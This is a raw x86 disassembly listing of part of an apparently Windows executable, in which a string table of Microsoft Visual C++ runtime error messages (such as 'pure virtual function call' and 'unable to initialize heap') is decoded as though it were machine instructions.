  40b252:	cmp    BYTE PTR [eax],bh
  40b254:	xor    BYTE PTR [ecx+0x36],al
  40b257:	sub    eax,0x46463844
  40b25c:	sub    eax,0x46433131
  40b261:	sub    eax,0x37373339
  40b266:	sub    eax,0x41413030
  40b26b:	xor    BYTE PTR [eax],dh
  40b26d:	xor    eax,DWORD PTR [edx+0x37]
  40b270:	inc    ecx
  40b271:	xor    DWORD PTR [ecx],esi
  40b273:	jge    0x40b2d1
  40b275:	dec    ecx
  40b276:	outs   dx,BYTE PTR ds:[esi]
  40b277:	jo     0x40b2eb
  40b279:	outs   dx,DWORD PTR ds:[esi]
  40b27a:	arpl   WORD PTR [ebx+0x65],dx
  40b27d:	jb     0x40b2f5
  40b27f:	gs jb  0x40b2b5
  40b282:	xor    al,BYTE PTR [eax]
  40b284:	and    bh,ch
  40b286:	inc    eax
  40b287:	add    BYTE PTR [eax-0x11],bh
  40b28a:	inc    eax
  40b28b:	add    BYTE PTR [ebx+0x6f],al
  40b28e:	jb     0x40b2d5
  40b290:	js     0x40b2fb
  40b292:	je     0x40b2e4
  40b294:	jb     0x40b305
  40b296:	arpl   WORD PTR [ebp+0x73],sp
  40b299:	jae    0x40b29b
  40b29b:	add    BYTE PTR [ebp+0x0],ch
  40b29e:	jae    0x40b2a0
  40b2a0:	arpl   WORD PTR [eax],ax
  40b2a2:	outs   dx,DWORD PTR ds:[esi]
  40b2a3:	add    BYTE PTR [edx+0x0],dh
  40b2a6:	add    BYTE PTR gs:[ebp+0x0],ah
  40b2aa:	add    BYTE PTR cs:[eax+eax*1+0x6c],ah
  40b2af:	add    BYTE PTR [eax+eax*1+0x0],ch
  40b2b3:	add    BYTE PTR [edx+0x75],dh
  40b2b6:	outs   dx,BYTE PTR ds:[esi]
  40b2b7:	je     0x40b322
  40b2b9:	ins    DWORD PTR es:[edi],dx
  40b2ba:	and    BYTE PTR gs:[ebp+0x72],ah
  40b2be:	jb     0x40b32f
  40b2c0:	jb     0x40b2e2
  40b2c2:	add    BYTE PTR [eax],al
  40b2c4:	or     eax,0x5400000a
  40b2c9:	dec    esp
  40b2ca:	dec    edi
  40b2cb:	push   ebx
  40b2cc:	push   ebx
  40b2cd:	and    BYTE PTR [ebp+0x72],ah
  40b2d0:	jb     0x40b341
  40b2d2:	jb     0x40b2e1
  40b2d4:	or     al,BYTE PTR [eax]
  40b2d6:	add    BYTE PTR [eax],al
  40b2d8:	push   ebx
  40b2d9:	dec    ecx
  40b2da:	dec    esi
  40b2db:	inc    edi
  40b2dc:	and    BYTE PTR [ebp+0x72],ah
  40b2df:	jb     0x40b350
  40b2e1:	jb     0x40b2f0
  40b2e3:	or     al,BYTE PTR [eax]
  40b2e5:	add    BYTE PTR [eax],al
  40b2e7:	add    BYTE PTR [edi+ecx*2+0x4d],al
  40b2eb:	inc    ecx
  40b2ec:	dec    ecx
  40b2ed:	dec    esi
  40b2ee:	and    BYTE PTR [ebp+0x72],ah
  40b2f1:	jb     0x40b362
  40b2f3:	jb     0x40b302
  40b2f5:	or     al,BYTE PTR [eax]
  40b2f7:	add    BYTE PTR [edx+0x36],dl
  40b2fa:	xor    BYTE PTR [ebx],dh
  40b2fc:	xor    al,0xd
  40b2fe:	or     al,BYTE PTR [ecx+0x6e]
  40b301:	and    BYTE PTR [ecx+0x70],ah
  40b304:	jo     0x40b372
  40b306:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  40b30d:	and    BYTE PTR [eax+0x61],ch
  40b310:	jae    0x40b332
  40b312:	ins    DWORD PTR es:[edi],dx
  40b313:	popa   
  40b314:	fs and BYTE PTR gs:[ecx+0x6e],ah
  40b319:	and    BYTE PTR [ecx+0x74],ah
  40b31c:	je     0x40b383
  40b31e:	ins    DWORD PTR es:[edi],dx
  40b31f:	jo     0x40b395
  40b321:	and    BYTE PTR [edi+ebp*2+0x20],dh
  40b325:	ins    BYTE PTR es:[edi],dx
  40b326:	outs   dx,DWORD PTR ds:[esi]
  40b327:	popa   
  40b328:	and    BYTE PTR fs:[eax+ebp*2+0x65],dh
  40b32d:	and    BYTE PTR [ebx+0x20],al
  40b330:	jb     0x40b3a7
  40b332:	outs   dx,BYTE PTR ds:[esi]
  40b333:	je     0x40b39e
  40b335:	ins    DWORD PTR es:[edi],dx
  40b336:	and    BYTE PTR gs:[ecx+ebp*2+0x62],ch
  40b33b:	jb     0x40b39e
  40b33d:	jb     0x40b3b8
  40b33f:	and    BYTE PTR [ecx+0x6e],ch
  40b342:	arpl   WORD PTR [edi+0x72],bp
  40b345:	jb     0x40b3ac
  40b347:	arpl   WORD PTR [esp+ebp*2+0x79],si
  40b34b:	or     dl,BYTE PTR cs:[eax+0x6c]
  40b34f:	gs popa 
  40b351:	jae    0x40b3b8
  40b353:	and    BYTE PTR [ebx+0x6f],ah
  40b356:	outs   dx,BYTE PTR ds:[esi]
  40b357:	je     0x40b3ba
  40b359:	arpl   WORD PTR [eax+eiz*1+0x74],si
  40b35d:	push   0x70612065
  40b362:	jo     0x40b3d0
  40b364:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  40b36b:	daa    
  40b36c:	jae    0x40b38e
  40b36e:	jae    0x40b3e5
  40b370:	jo     0x40b3e2
  40b372:	outs   dx,DWORD PTR ds:[esi]
  40b373:	jb     0x40b3e9
  40b375:	and    BYTE PTR [ebp+eiz*2+0x61],dh
  40b379:	ins    DWORD PTR es:[edi],dx
  40b37a:	and    BYTE PTR [esi+0x6f],ah
  40b37d:	jb     0x40b39f
  40b37f:	ins    DWORD PTR es:[edi],dx
  40b380:	outs   dx,DWORD PTR ds:[esi]
  40b381:	jb     0x40b3e8
  40b383:	and    BYTE PTR [ecx+0x6e],ch
  40b386:	outs   dx,WORD PTR ds:[esi]
  40b388:	jb     0x40b3f7
  40b38a:	popa   
  40b38b:	je     0x40b3f6
  40b38d:	outs   dx,DWORD PTR ds:[esi]
  40b38e:	outs   dx,BYTE PTR ds:[esi]
  40b38f:	cs or  eax,0xa
  40b395:	add    BYTE PTR [eax],al
  40b397:	add    BYTE PTR [edx+0x36],dl
  40b39a:	xor    BYTE PTR [ebx],dh
  40b39c:	xor    ecx,DWORD PTR ds:0x41202d0a
  40b3a2:	je     0x40b418
  40b3a4:	gs ins DWORD PTR es:[edi],dx
  40b3a6:	jo     0x40b41c
  40b3a8:	and    BYTE PTR [edi+ebp*2+0x20],dh
  40b3ac:	jne    0x40b421
  40b3ae:	and    BYTE PTR gs:[ebp+0x53],cl
  40b3b2:	dec    ecx
  40b3b3:	dec    esp
  40b3b4:	and    BYTE PTR [ebx+0x6f],ah
  40b3b7:	fs and BYTE PTR gs:[esi+0x72],ah
  40b3bc:	outs   dx,DWORD PTR ds:[esi]
  40b3bd:	ins    DWORD PTR es:[edi],dx
  40b3be:	and    BYTE PTR [eax+ebp*2+0x69],dh
  40b3c2:	jae    0x40b3e4
  40b3c4:	popa   
  40b3c5:	jae    0x40b43a
  40b3c7:	gs ins DWORD PTR es:[edi],dx
  40b3c9:	bound  ebp,QWORD PTR [ecx+edi*2+0x20]
  40b3cd:	fs jne 0x40b442
  40b3d0:	imul   ebp,DWORD PTR [esi+0x67],0x74616e20
  40b3d7:	imul   esi,DWORD PTR [esi+0x65],0x646f6320
  40b3de:	and    BYTE PTR gs:[ecx+0x6e],ch
  40b3e2:	imul   esi,DWORD PTR [ecx+ebp*2+0x61],0x617a696c
  40b3ea:	je     0x40b455
  40b3ec:	outs   dx,DWORD PTR ds:[esi]
  40b3ed:	outs   dx,BYTE PTR ds:[esi]
  40b3ee:	or     dl,BYTE PTR [eax+ebp*2+0x69]
  40b3f2:	jae    0x40b414
  40b3f4:	imul   ebp,DWORD PTR [esi+0x64],0x74616369
  40b3fb:	gs jae 0x40b41e
  40b3fe:	popa   
  40b3ff:	and    BYTE PTR [edx+0x75],ah
  40b402:	and    BYTE PTR [bx+di+0x6e],ch
  40b406:	and    BYTE PTR [ecx+0x6f],bh
  40b409:	jne    0x40b47d
  40b40b:	and    BYTE PTR [ecx+0x70],ah
  40b40e:	jo     0x40b47c
  40b410:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  40b417:	and    BYTE PTR cs:[ecx+0x74],cl
  40b41b:	and    BYTE PTR [ecx+0x73],ch
  40b41e:	and    BYTE PTR [ebp+0x6f],ch
  40b421:	jae    0x40b497
  40b423:	and    BYTE PTR [ecx+ebp*2+0x6b],ch
  40b427:	gs ins BYTE PTR es:[edi],dx
  40b429:	jns    0x40b44b
  40b42b:	je     0x40b495
  40b42d:	and    BYTE PTR gs:[edx+0x65],dh
  40b431:	jae    0x40b4a8
  40b433:	ins    BYTE PTR es:[edi],dx
  40b434:	je     0x40b456
  40b436:	outs   dx,DWORD PTR ds:[esi]
  40b437:	data16 and BYTE PTR [ebx+0x61],ah
  40b43b:	ins    BYTE PTR es:[edi],dx
  40b43c:	ins    BYTE PTR es:[edi],dx
  40b43d:	imul   ebp,DWORD PTR [esi+0x67],0x206e6120
  40b444:	dec    ebp
  40b445:	push   ebx
  40b446:	dec    ecx
  40b447:	dec    esp
  40b448:	sub    eax,0x706d6f63
  40b44d:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x632f2820
  40b455:	ins    BYTE PTR es:[edi],dx
  40b456:	jb     0x40b481
  40b458:	and    BYTE PTR [esi+0x75],ah
  40b45b:	outs   dx,BYTE PTR ds:[esi]
  40b45c:	arpl   WORD PTR [ecx+ebp*2+0x6f],si
  40b460:	outs   dx,BYTE PTR ds:[esi]
  40b461:	and    BYTE PTR [esi+0x72],ah
  40b464:	outs   dx,DWORD PTR ds:[esi]
  40b465:	ins    DWORD PTR es:[edi],dx
  40b466:	and    BYTE PTR [ecx+0x20],ah
  40b469:	outs   dx,BYTE PTR ds:[esi]
  40b46a:	popa   
  40b46b:	je     0x40b4d6
  40b46d:	jbe    0x40b4d4
  40b46f:	and    BYTE PTR [ebx+0x6f],ah
  40b472:	outs   dx,BYTE PTR ds:[esi]
  40b473:	jae    0x40b4e9
  40b475:	jb     0x40b4ec
  40b477:	arpl   WORD PTR [edi+ebp*2+0x72],si
  40b47b:	and    BYTE PTR [edi+0x72],ch
  40b47e:	and    BYTE PTR [esi+0x72],ah
  40b481:	outs   dx,DWORD PTR ds:[esi]
  40b482:	ins    DWORD PTR es:[edi],dx
  40b483:	and    BYTE PTR [esp+ebp*2+0x6c],al
  40b487:	dec    ebp
  40b488:	popa   
  40b489:	imul   ebp,DWORD PTR [esi+0x2e],0xa0d
  40b490:	push   edx
  40b491:	xor    BYTE PTR ss:[ebx],dh
  40b494:	xor    cl,BYTE PTR ds:0x6e202d0a
  40b49a:	outs   dx,DWORD PTR ds:[esi]
  40b49b:	je     0x40b4bd
  40b49d:	outs   dx,BYTE PTR gs:[esi]
  40b49f:	outs   dx,DWORD PTR ds:[esi]
  40b4a0:	jne    0x40b509
  40b4a2:	push   0x61707320
  40b4a7:	arpl   WORD PTR [ebp+0x20],sp
  40b4aa:	outs   dx,WORD PTR ds:[esi]
  40b4ac:	jb     0x40b4ce
  40b4ae:	ins    BYTE PTR es:[edi],dx
  40b4af:	outs   dx,DWORD PTR ds:[esi]
  40b4b0:	arpl   WORD PTR [ecx+0x6c],sp
  40b4b3:	and    BYTE PTR gs:[ecx+0x6e],ch
  40b4b7:	outs   dx,WORD PTR ds:[esi]
  40b4b9:	jb     0x40b528
  40b4bb:	popa   
  40b4bc:	je     0x40b527
  40b4be:	outs   dx,DWORD PTR ds:[esi]
  40b4bf:	outs   dx,BYTE PTR ds:[esi]
  40b4c0:	or     eax,0xa
  40b4c5:	add    BYTE PTR [eax],al
  40b4c7:	add    BYTE PTR [edx+0x36],dl
  40b4ca:	xor    BYTE PTR [ebx],dh
  40b4cc:	xor    DWORD PTR ds:0x41202d0a,ecx
  40b4d2:	je     0x40b548
  40b4d4:	gs ins DWORD PTR es:[edi],dx
  40b4d6:	jo     0x40b54c
  40b4d8:	and    BYTE PTR [edi+ebp*2+0x20],dh
  40b4dc:	imul   ebp,DWORD PTR [esi+0x69],0x6c616974
  40b4e3:	imul   edi,DWORD PTR [edx+0x65],0x65687420
  40b4ea:	and    BYTE PTR [ebx+0x52],al
  40b4ed:	push   esp
  40b4ee:	and    BYTE PTR [ebp+0x6f],ch
  40b4f1:	jb     0x40b558
  40b4f3:	and    BYTE PTR [eax+ebp*2+0x61],dh
  40b4f7:	outs   dx,BYTE PTR ds:[esi]
  40b4f8:	and    BYTE PTR [edi+0x6e],ch
  40b4fb:	arpl   WORD PTR [ebp+0x2e],sp
  40b4fe:	or     dl,BYTE PTR [eax+ebp*2+0x69]
  40b502:	jae    0x40b524
  40b504:	imul   ebp,DWORD PTR [esi+0x64],0x74616369
  40b50b:	gs jae 0x40b52e
  40b50e:	popa   
  40b50f:	and    BYTE PTR [edx+0x75],ah
  40b512:	and    BYTE PTR [bx+di+0x6e],ch
  40b516:	and    BYTE PTR [ecx+0x6f],bh
  40b519:	jne    0x40b58d
  40b51b:	and    BYTE PTR [ecx+0x70],ah
  40b51e:	jo     0x40b58c
  40b520:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  40b527:	cs or  eax,0x5200000a
  40b52d:	xor    BYTE PTR ss:[ebx],dh
  40b530:	xor    BYTE PTR ds:0x43202d0a,cl
  40b536:	push   edx
  40b537:	push   esp
  40b538:	and    BYTE PTR [esi+0x6f],ch
  40b53b:	je     0x40b55d
  40b53d:	imul   ebp,DWORD PTR [esi+0x69],0x6c616974
  40b544:	imul   edi,DWORD PTR [edx+0x65],0xa0d64
  40b54b:	add    BYTE PTR [edx+0x36],dl
  40b54e:	xor    BYTE PTR [edx],dh
  40b550:	cmp    BYTE PTR ds:0x75202d0a,cl
  40b556:	outs   dx,BYTE PTR ds:[esi]
  40b557:	popa   
  40b558:	bound  ebp,QWORD PTR [ebp+eiz*2+0x20]
  40b55c:	je     0x40b5cd
  40b55e:	and    BYTE PTR [ecx+0x6e],ch
  40b561:	imul   esi,DWORD PTR [ecx+ebp*2+0x61],0x657a696c
  40b569:	and    BYTE PTR [eax+0x65],ch
  40b56c:	popa   
  40b56d:	jo     0x40b57c
  40b56f:	or     al,BYTE PTR [eax]
  40b571:	add    BYTE PTR [eax],al
  40b573:	add    BYTE PTR [edx+0x36],dl
  40b576:	xor    BYTE PTR [edx],dh
  40b578:	aaa    
  40b579:	or     eax,0x6e202d0a
  40b57e:	outs   dx,DWORD PTR ds:[esi]
  40b57f:	je     0x40b5a1
  40b581:	outs   dx,BYTE PTR gs:[esi]
  40b583:	outs   dx,DWORD PTR ds:[esi]
  40b584:	jne    0x40b5ed
  40b586:	push   0x61707320
  40b58b:	arpl   WORD PTR [ebp+0x20],sp
  40b58e:	outs   dx,WORD PTR ds:[esi]
  40b590:	jb     0x40b5b2
  40b592:	ins    BYTE PTR es:[edi],dx
  40b593:	outs   dx,DWORD PTR ds:[esi]
  40b594:	ja     0x40b5ff
  40b596:	outs   dx,DWORD PTR ds:[esi]
  40b597:	and    BYTE PTR [ecx+0x6e],ch
  40b59a:	imul   esi,DWORD PTR [ecx+ebp*2+0x61],0x617a696c
  40b5a2:	je     0x40b60d
  40b5a4:	outs   dx,DWORD PTR ds:[esi]
  40b5a5:	outs   dx,BYTE PTR ds:[esi]
  40b5a6:	or     eax,0xa
  40b5ab:	add    BYTE PTR [edx+0x36],dl
  40b5ae:	xor    BYTE PTR [edx],dh
  40b5b0:	ss or  eax,0x6e202d0a
  40b5b6:	outs   dx,DWORD PTR ds:[esi]
  40b5b7:	je     0x40b5d9
  40b5b9:	outs   dx,BYTE PTR gs:[esi]
  40b5bb:	outs   dx,DWORD PTR ds:[esi]
  40b5bc:	jne    0x40b625
  40b5be:	push   0x61707320
  40b5c3:	arpl   WORD PTR [ebp+0x20],sp
  40b5c6:	outs   dx,WORD PTR ds:[esi]
  40b5c8:	jb     0x40b5ea
  40b5ca:	jae    0x40b640
  40b5cc:	imul   ebp,DWORD PTR fs:[edi+0x20],0x74696e69
  40b5d4:	imul   esp,DWORD PTR [ecx+0x6c],0x74617a69
  40b5db:	imul   ebp,DWORD PTR [edi+0x6e],0xa0d
  40b5e2:	add    BYTE PTR [eax],al
  40b5e4:	push   edx
  40b5e5:	xor    BYTE PTR ss:[edx],dh
  40b5e8:	xor    eax,0x202d0a0d
  40b5ed:	jo     0x40b664
  40b5ef:	jb     0x40b656
  40b5f1:	and    BYTE PTR [esi+0x69],dh
  40b5f4:	jb     0x40b66a
  40b5f6:	jne    0x40b659
  40b5f8:	ins    BYTE PTR es:[edi],dx
  40b5f9:	and    BYTE PTR [esi+0x75],ah
  40b5fc:	outs   dx,BYTE PTR ds:[esi]
  40b5fd:	arpl   WORD PTR [ecx+ebp*2+0x6f],si
  40b601:	outs   dx,BYTE PTR ds:[esi]
  40b602:	and    BYTE PTR [ebx+0x61],ah
  40b605:	ins    BYTE PTR es:[edi],dx
  40b606:	ins    BYTE PTR es:[edi],dx
  40b607:	or     eax,0xa
  40b60c:	push   edx
  40b60d:	xor    BYTE PTR ss:[edx],dh
  40b610:	xor    al,0xd
  40b612:	or     ch,BYTE PTR ds:0x746f6e20
  40b618:	and    BYTE PTR [ebp+0x6e],ah
  40b61b:	outs   dx,DWORD PTR ds:[esi]
  40b61c:	jne    0x40b685
  40b61e:	push   0x61707320
  40b623:	arpl   WORD PTR [ebp+0x20],sp
  40b626:	outs   dx,WORD PTR ds:[esi]
  40b628:	jb     0x40b64a
  40b62a:	pop    edi
  40b62b:	outs   dx,DWORD PTR ds:[esi]
  40b62c:	outs   dx,BYTE PTR ds:[esi]
  40b62d:	gs js  0x40b699
  40b630:	je     0x40b661
  40b632:	popa   
  40b633:	je     0x40b69a
  40b635:	js     0x40b6a0
  40b637:	je     0x40b659
  40b639:	je     0x40b69c
  40b63b:	bound  ebp,QWORD PTR [ebp+eiz*2+0xd]
  40b63f:	or     al,BYTE PTR [eax]
  40b641:	add    BYTE PTR [eax],al
  40b643:	add    BYTE PTR [edx+0x36],dl
  40b646:	xor    BYTE PTR [ecx],dh
  40b648:	cmp    DWORD PTR ds:0x75202d0a,ecx
  40b64e:	outs   dx,BYTE PTR ds:[esi]
  40b64f:	popa   
  40b650:	bound  ebp,QWORD PTR [ebp+eiz*2+0x20]
  40b654:	je     0x40b6c5
  40b656:	and    BYTE PTR [edi+0x70],ch
  40b659:	outs   dx,BYTE PTR gs:[esi]
  40b65b:	and    BYTE PTR [ebx+0x6f],ah
  40b65e:	outs   dx,BYTE PTR ds:[esi]
  40b65f:	jae    0x40b6d0
  40b661:	ins    BYTE PTR es:[edi],dx
  40b662:	and    BYTE PTR gs:[ebp+eiz*2+0x76],ah
  40b667:	imul   esp,DWORD PTR [ebx+0x65],0xa0d
  40b66e:	add    BYTE PTR [eax],al
  40b670:	push   edx
  40b671:	xor    BYTE PTR ss:[ecx],dh
  40b674:	cmp    BYTE PTR ds:0x75202d0a,cl
  40b67a:	outs   dx,BYTE PTR ds:[esi]
  40b67b:	gs js  0x40b6ee
  40b67e:	arpl   WORD PTR gs:[ebp+eiz*2+0x64],si
  40b683:	and    BYTE PTR [eax+0x65],ch
  40b686:	popa   
  40b687:	jo     0x40b6a9
  40b689:	gs jb  0x40b6fe
  40b68c:	outs   dx,DWORD PTR ds:[esi]
  40b68d:	jb     0x40b69c
  40b68f:	or     al,BYTE PTR [eax]
  40b691:	add    BYTE PTR [eax],al
  40b693:	add    BYTE PTR [edx+0x36],dl
  40b696:	xor    BYTE PTR [ecx],dh
  40b698:	aaa    
  40b699:	or     eax,0x75202d0a
  40b69e:	outs   dx,BYTE PTR ds:[esi]
  40b69f:	gs js  0x40b712
  40b6a2:	arpl   WORD PTR gs:[ebp+eiz*2+0x64],si
  40b6a7:	and    BYTE PTR [ebp+0x75],ch
  40b6aa:	ins    BYTE PTR es:[edi],dx
  40b6ab:	je     0x40b716
  40b6ad:	je     0x40b717
  40b6af:	jb     0x40b716
  40b6b1:	popa   
  40b6b2:	and    BYTE PTR fs:[edi+ebp*2+0x63],ch
  40b6b7:	imul   esp,DWORD PTR [eax],0x65
  40b6ba:	jb     0x40b72e
  40b6bc:	outs   dx,DWORD PTR ds:[esi]
  40b6bd:	jb     0x40b6cc
  40b6bf:	or     al,BYTE PTR [eax]
  40b6c1:	add    BYTE PTR [eax],al
  40b6c3:	add    BYTE PTR [edx+0x36],dl
  40b6c6:	xor    BYTE PTR [ecx],dh
  40b6c8:	ss or  eax,0x6e202d0a
  40b6ce:	outs   dx,DWORD PTR ds:[esi]
  40b6cf:	je     0x40b6f1
  40b6d1:	outs   dx,BYTE PTR gs:[esi]
  40b6d3:	outs   dx,DWORD PTR ds:[esi]
  40b6d4:	jne    0x40b73d
  40b6d6:	push   0x61707320
  40b6db:	arpl   WORD PTR [ebp+0x20],sp
  40b6de:	outs   dx,WORD PTR ds:[esi]
  40b6e0:	jb     0x40b702
  40b6e2:	je     0x40b74c
  40b6e4:	jb     0x40b74b
  40b6e6:	popa   
  40b6e7:	and    BYTE PTR fs:[ecx+eiz*2+0x74],ah
  40b6ec:	popa   
  40b6ed:	or     eax,0xa0d000a
  40b6f2:	push   esp
  40b6f3:	push   0x61207369
  40b6f8:	jo     0x40b76a
  40b6fa:	ins    BYTE PTR es:[edi],dx
  40b6fb:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  40b702:	and    BYTE PTR [eax+0x61],ch
  40b705:	jae    0x40b727
  40b707:	jb     0x40b76e
  40b709:	jno    0x40b780
  40b70b:	gs jae 0x40b782
  40b70e:	gs and BYTE PTR fs:[eax+ebp*2+0x65],dh
  40b714:	and    BYTE PTR [edx+0x75],dl
  40b717:	outs   dx,BYTE PTR ds:[esi]
  40b718:	je     0x40b783
  40b71a:	ins    DWORD PTR es:[edi],dx
  40b71b:	and    BYTE PTR gs:[edi+ebp*2+0x20],dh
  40b720:	je     0x40b787
  40b722:	jb     0x40b791
  40b724:	imul   ebp,DWORD PTR [esi+0x61],0x69206574
  40b72b:	je     0x40b74d
  40b72d:	imul   ebp,DWORD PTR [esi+0x20],0x75206e61
  40b734:	outs   dx,BYTE PTR ds:[esi]
  40b735:	jne    0x40b7aa
  40b737:	jne    0x40b79a
  40b739:	ins    BYTE PTR es:[edi],dx
  40b73a:	and    BYTE PTR [edi+0x61],dh
  40b73d:	jns    0x40b76d
  40b73f:	or     dl,BYTE PTR [eax+0x6c]
  40b742:	gs popa 
  40b744:	jae    0x40b7ab
  40b746:	and    BYTE PTR [ebx+0x6f],ah
  40b749:	outs   dx,BYTE PTR ds:[esi]
  40b74a:	je     0x40b7ad
  40b74c:	arpl   WORD PTR [eax+eiz*1+0x74],si
  40b750:	push   0x70612065
  40b755:	jo     0x40b7c3
  40b757:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  40b75e:	daa    
  40b75f:	jae    0x40b781
  40b761:	jae    0x40b7d8
  40b763:	jo     0x40b7d5
  40b765:	outs   dx,DWORD PTR ds:[esi]
  40b766:	jb     0x40b7dc
  40b768:	and    BYTE PTR [ebp+eiz*2+0x61],dh
  40b76c:	ins    DWORD PTR es:[edi],dx
  40b76d:	and    BYTE PTR [esi+0x6f],ah
  40b770:	jb     0x40b792
  40b772:	ins    DWORD PTR es:[edi],dx
  40b773:	outs   dx,DWORD PTR ds:[esi]
  40b774:	jb     0x40b7db
  40b776:	and    BYTE PTR [ecx+0x6e],ch
  40b779:	outs   dx,WORD PTR ds:[esi]
  40b77b:	jb     0x40b7ea
  40b77d:	popa   
  40b77e:	je     0x40b7e9
  40b780:	outs   dx,DWORD PTR ds:[esi]
  40b781:	outs   dx,BYTE PTR ds:[esi]
  40b782:	cs or  eax,0xa
  40b788:	push   edx
  40b789:	xor    BYTE PTR ss:[eax],dh
  40b78c:	cmp    DWORD PTR ds:0x6e202d0a,ecx
  40b792:	outs   dx,DWORD PTR ds:[esi]
  40b793:	je     0x40b7b5
  40b795:	outs   dx,BYTE PTR gs:[esi]
  40b797:	outs   dx,DWORD PTR ds:[esi]
  40b798:	jne    0x40b801
  40b79a:	push   0x61707320
  40b79f:	arpl   WORD PTR [ebp+0x20],sp
  40b7a2:	outs   dx,WORD PTR ds:[esi]
  40b7a4:	jb     0x40b7c6
  40b7a6:	outs   dx,BYTE PTR gs:[esi]
  40b7a8:	jbe    0x40b813
  40b7aa:	jb     0x40b81b
  40b7ac:	outs   dx,BYTE PTR ds:[esi]
  40b7ad:	ins    DWORD PTR es:[edi],dx
  40b7ae:	outs   dx,BYTE PTR gs:[esi]
  40b7b0:	je     0x40b7bf
  40b7b2:	or     al,BYTE PTR [eax]
  40b7b4:	push   edx
  40b7b5:	xor    BYTE PTR ss:[eax],dh
  40b7b8:	cmp    BYTE PTR ds:0x6e202d0a,cl
  40b7be:	outs   dx,DWORD PTR ds:[esi]
  40b7bf:	je     0x40b7e1
  40b7c1:	outs   dx,BYTE PTR gs:[esi]
  40b7c3:	outs   dx,DWORD PTR ds:[esi]
  40b7c4:	jne    0x40b82d
  40b7c6:	push   0x61707320
  40b7cb:	arpl   WORD PTR [ebp+0x20],sp
  40b7ce:	outs   dx,WORD PTR ds:[esi]
  40b7d0:	jb     0x40b7f2
  40b7d2:	popa   
  40b7d3:	jb     0x40b83c
  40b7d5:	jne    0x40b844
  40b7d7:	outs   dx,BYTE PTR gs:[esi]
  40b7d9:	je     0x40b84e
  40b7db:	or     eax,0xa
  40b7e0:	push   edx
  40b7e1:	xor    BYTE PTR ss:[eax],dh
  40b7e4:	xor    cl,BYTE PTR ds:0x66202d0a
  40b7ea:	ins    BYTE PTR es:[edi],dx
  40b7eb:	outs   dx,DWORD PTR ds:[esi]
  40b7ec:	popa   
  40b7ed:	je     0x40b858
  40b7ef:	outs   dx,BYTE PTR ds:[esi]
  40b7f0:	and    BYTE PTR [bx+si+0x6f],dh
  40b7f4:	imul   ebp,DWORD PTR [esi+0x74],0x70757320
  40b7fb:	jo     0x40b86c
  40b7fd:	jb     0x40b873
  40b7ff:	and    BYTE PTR [esi+0x6f],ch
  40b802:	je     0x40b824
  40b804:	ins    BYTE PTR es:[edi],dx
  40b805:	outs   dx,DWORD PTR ds:[esi]
  40b806:	popa   
  40b807:	fs gs fs or eax,0xa
  40b80f:	add    BYTE PTR [ebp+0x69],cl
  40b812:	arpl   WORD PTR [edx+0x6f],si
  40b815:	jae    0x40b886
  40b817:	data16 je 0x40b83a
  40b81a:	push   esi
  40b81b:	imul   esi,DWORD PTR [ebx+0x75],0x43206c61
  40b822:	sub    ebp,DWORD PTR [ebx]
  40b824:	and    BYTE PTR [edx+0x75],dl
  40b827:	outs   dx,BYTE PTR ds:[esi]
  40b828:	je     0x40b893
  40b82a:	ins    DWORD PTR es:[edi],dx
  40b82b:	and    BYTE PTR gs:[ecx+ebp*2+0x62],cl
  40b830:	jb     0x40b893
  40b832:	jb     0x40b8ad
  40b834:	add    BYTE PTR [eax],al
  40b836:	add    BYTE PTR [eax],al
  40b838:	or     cl,BYTE PTR [edx]
  40b83a:	add    BYTE PTR [eax],al
  40b83c:	cs cs add BYTE PTR cs:[eax+esi*2],bh
  40b842:	jb     0x40b8b3
  40b844:	addr16 jb 0x40b8a8
  40b847:	ins    DWORD PTR es:[edi],dx
  40b848:	and    BYTE PTR [esi+0x61],ch
  40b84b:	ins    DWORD PTR es:[edi],dx
  40b84c:	and    BYTE PTR gs:[ebp+0x6e],dh
  40b850:	imul   ebp,DWORD PTR [esi+0x6f],0x77
  40b854:	outs   dx,BYTE PTR ds:[esi]
  40b855:	add    BYTE PTR ds:[eax],al
  40b858:	push   edx
  40b859:	jne    0x40b8c9
  40b85b:	je     0x40b8c6
  40b85d:	ins    DWORD PTR es:[edi],dx
  40b85e:	and    BYTE PTR gs:[ebp+0x72],al
  40b862:	jb     0x40b8d3
  40b864:	jb     0x40b887
  40b866:	or     cl,BYTE PTR [edx]
  40b868:	push   eax
  40b869:	jb     0x40b8da
  40b86b:	addr16 jb 0x40b8cf
  40b86e:	ins    DWORD PTR es:[edi],dx
  40b86f:	cmp    ah,BYTE PTR [eax]
  40b871:	add    BYTE PTR [eax],al
  40b873:	add    BYTE PTR [eax],al
  40b875:	add    BYTE PTR [eax],al
  40b877:	add    BYTE PTR ds:0xbc00000,al
  40b87d:	add    BYTE PTR [eax],al
  40b87f:	add    BYTE PTR [eax],al
  40b881:	add    BYTE PTR [eax],al
  40b883:	add    BYTE PTR ds:0x4c00000,bl
  40b889:	add    BYTE PTR [eax],al
  40b88b:	add    BYTE PTR [eax],al
  40b88d:	add    BYTE PTR [eax],al
  40b88f:	add    BYTE PTR [esi+0x4c00000],dl
  40b895:	add    BYTE PTR [eax],al
  40b897:	add    BYTE PTR [eax],al
  40b899:	add    BYTE PTR [eax],al
  40b89b:	add    BYTE PTR [ebp+0x8c00000],cl
  40b8a1:	add    BYTE PTR [eax],al
  40b8a3:	add    BYTE PTR [eax],al
  40b8a5:	add    BYTE PTR [eax],al
  40b8a7:	add    BYTE PTR [esi+0x8c00000],cl
  40b8ad:	add    BYTE PTR [eax],al
  40b8af:	add    BYTE PTR [eax],al
  40b8b1:	add    BYTE PTR [eax],al
  40b8b3:	add    BYTE PTR [edi+0x8c00000],cl
  40b8b9:	add    BYTE PTR [eax],al
  40b8bb:	add    BYTE PTR [eax],al
  40b8bd:	add    BYTE PTR [eax],al
  40b8bf:	add    BYTE PTR [eax+0x8c00000],dl
  40b8c5:	add    BYTE PTR [eax],al
  40b8c7:	add    BYTE PTR [eax],al
  40b8c9:	add    BYTE PTR [eax],al
  40b8cb:	add    BYTE PTR [ecx+0x8c00000],dl
  40b8d1:	add    BYTE PTR [eax],al
  40b8d3:	add    BYTE PTR [eax],al
  40b8d5:	add    BYTE PTR [eax],al
